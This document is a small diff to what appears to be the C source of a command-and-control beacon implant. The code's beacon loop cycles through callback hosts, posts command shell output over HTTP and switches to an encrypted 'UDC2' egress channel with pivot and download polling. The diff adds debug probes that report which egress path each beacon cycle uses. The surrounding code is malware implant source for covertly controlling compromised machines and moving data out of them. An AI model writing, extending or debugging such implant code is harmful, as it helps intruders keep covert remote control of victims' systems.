@@ -35,6 +35,7 @@ extern int http_post_len;
 
 /* tier-2 item6: engage-mode egress for encrypted callback chunks */
 extern void udc2_queue(char * data, int length);
+extern BOOL udc2_booted(void);
 
 void command_shell_post(char * buffer, int length, int type, BOOL sendNow) {
 	DWORD bar = 0;
@@ -171,6 +172,8 @@ void beacon(LPVOID lpReserved) {
 		_snprintf(url, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
 
 		/* 使用HTTP通信输出 */
+		if (udc2_booted())
+			post_error_d(0x65, beacon_cycles); /* probe: HTTP cycle AFTER udc2 booted */
 		post_type = POST_HTTP;
 
 		/* 创建URL */
@@ -252,6 +255,7 @@ void beacon(LPVOID lpReserved) {
 		 * BOF loader runs */
 		beacon_cycles++;
 		if (beacon_cycles >= 1 && udc2_init()) {
+			post_error_d(0x62, beacon_cycles); /* probe: engage round (rides UDC2 egress) */
 			post_type = POST_UDC2;
 			pivot_poll(command_shell_callback);
 			download_poll(command_shell_callback, MAX_PACKET);
